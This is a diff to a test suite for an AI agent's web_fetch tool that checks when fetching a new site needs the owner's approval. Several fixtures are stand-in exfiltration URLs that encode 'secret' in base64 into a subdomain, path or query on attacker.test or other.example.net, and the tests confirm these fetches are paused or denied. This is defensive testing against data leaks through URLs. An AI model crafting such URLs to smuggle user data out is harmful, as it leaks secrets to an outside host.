@@ -2011,9 +2011,10 @@ describe("outbound destinations", () => {
       f.pauseRunForInput.mock.calls as unknown as [{ blocks: Array<Record<string, unknown>> }][]
     )[0]?.[0].blocks[0];
 
-  it("fetches sites the owner named and asks before any other site", async () => {
+  it("fetches sites the owner named and asks before any other site in Always ask", async () => {
     const f = fixture({
       builtin: true,
+      alwaysAsk: true,
       sourceRole: "user",
       prompt: "Summarize https://docs.example.com/guide",
     });
@@ -2029,7 +2030,8 @@ describe("outbound destinations", () => {
     expect(f.fetchedUrls).toEqual(["https://example.com/pricing"]);
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
     expect(pausedCard(f)).toMatchObject({
-      text: "Review before web_fetch → attacker.test",
+      text: "Open attacker.test?",
+      card: { code: "open_website", params: { site: "attacker.test" } },
       detail: "url: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
       site: "attacker.test",
       actions: [
@@ -2043,7 +2045,7 @@ describe("outbound destinations", () => {
   it.each(["ada.li@example.org", "ada.li+tag@example.org", "ada.li@例子.测试"])(
     "asks before fetching a site found only in the email local part of %s",
     async (email) => {
-      const f = fixture({ builtin: true, sourceRole: "user", prompt: email });
+      const f = fixture({ builtin: true, alwaysAsk: true, sourceRole: "user", prompt: email });
       f.setCalls([{ name: "web_fetch", args: { url: "https://ada.li/" }, executionId: "call-1" }]);
       await f.run();
       expect(f.fetchedUrls).toEqual([]);
@@ -2064,7 +2066,7 @@ describe("outbound destinations", () => {
       prompt: "Read https://attacker.test/",
     });
     f.setCalls([
-      { name: "web_fetch", args: { url: "https://attacker.test/" }, executionId: "call-1" },
+      { name: "web_fetch", args: { url: "https://attacker.test/?q=x" }, executionId: "call-1" },
     ]);
     await f.run();
     expect(f.fetchedUrls).toEqual([]);
@@ -2111,6 +2113,92 @@ describe("outbound destinations", () => {
     expect(isApprovalPausedResult(f.results[2])).toBe(true);
   });
 
+  it("reads a new site without asking in a clean run", async () => {
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Read the data protection law",
+    });
+    const url = "https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm";
+    f.setCalls([{ name: "web_fetch", args: { url }, executionId: "call-1" }]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([url]);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+  });
+
+  it("reads a new site with a query in a clean run, since the model chose it", async () => {
+    const f = fixture({ builtin: true, sourceRole: "user", prompt: "Look it up" });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: "https://example.org/search?q=lgpd" },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://example.org/search?q=lgpd"]);
+  });
+
+  it("reads a plain URL on a new site after outside content entered the run", async () => {
+    const f = fixture({ builtin: true, sourceRole: "user", prompt: "Read the news" });
+    f.web.searchHits = [{ title: "Found", url: "https://found.test/article", snippet: "" }];
+    f.setCalls([
+      { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+      {
+        name: "web_fetch",
+        args: { url: "https://other.example.net/law/13709" },
+        executionId: "call-2",
+      },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://other.example.net/law/13709"]);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    "https://other.example.net/page?q=anything",
+    "https://other.example.net/page#frag",
+    "https://other.example.net/dGhpc2lzc2VjcmV0ZGF0YTEyMw",
+    "https://dGhpc2lzc2VjcmV0ZGF0YTEyMw.other.example.net/",
+  ])("asks before a payload-looking URL %s once outside content entered the run", async (url) => {
+    const f = fixture({ builtin: true, sourceRole: "user", prompt: "Read the news" });
+    f.setCalls([
+      { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+      { name: "web_fetch", args: { url }, executionId: "call-2" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(isApprovalPausedResult(f.results[1])).toBe(true);
+    expect(pausedCard(f)).toMatchObject({ site: "example.net" });
+  });
+
+  it("keeps asking in Always ask even for a clean run", async () => {
+    const f = fixture({ builtin: true, alwaysAsk: true, sourceRole: "user", prompt: "Read" });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://other.example.net/" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(isApprovalPausedResult(f.results[0])).toBe(true);
+  });
+
+  it("denies a payload URL in a webhook run, and reads a plain one", async () => {
+    const f = fixture({ builtin: true, trigger: "webhook" });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: "https://other.example.net/?d=secret" },
+        executionId: "call-1",
+      },
+      { name: "web_fetch", args: { url: "https://other.example.net/law" }, executionId: "call-2" },
+    ]);
+    await f.run();
+    expect(f.results[0]).toEqual({
+      error: "Fetching example.net needs approval, and a webhook run cannot ask.",
+    });
+    expect(f.fetchedUrls).toEqual(["https://other.example.net/law"]);
+  });
+
   it("refuses a URL that is not http(s)", async () => {
     const f = fixture({ builtin: true });
     f.setCalls([{ name: "web_fetch", args: { url: "attacker.test" }, executionId: "call-1" }]);
@@ -2154,6 +2242,7 @@ describe("outbound destinations", () => {
   it("shows and stores the normalized URL, and a rule for the whole tool does not allow a new site", async () => {
     const f = fixture({
       builtin: true,
+      alwaysAsk: true,
       rules: [{ effect: "always_allow", matchKind: "tool", matchValue: "web_fetch" }],
     });
     f.setCalls([
@@ -2462,7 +2551,7 @@ describe("Auto Review of new sites", () => {
       });
       f.setCalls([
         fetchCall("https://ci.example.dev/builds/7"),
-        fetchCall("https://attacker.test/", "call-2"),
+        fetchCall("https://attacker.test/?q=x", "call-2"),
       ]);
       await f.run();
       expect(f.fetchedUrls).toEqual(["https://ci.example.dev/builds/7"]);
@@ -3784,8 +3873,8 @@ describe("outbound URL leak checks", () => {
     expect(refusal(f, 0)).toMatch(/key or token/);
   });
 
-  it("keeps the site check: a clean URL on a site the run was not given still asks", async () => {
-    const f = fixture({ builtin: true, prompt: "Read the news" });
+  it("keeps the site check in Always ask: a clean URL on a site the run was not given asks", async () => {
+    const f = fixture({ builtin: true, alwaysAsk: true, prompt: "Read the news" });
     f.setCalls([
       { name: "web_fetch", args: { url: "https://other.example.net/page" }, executionId: "call-1" },
     ]);
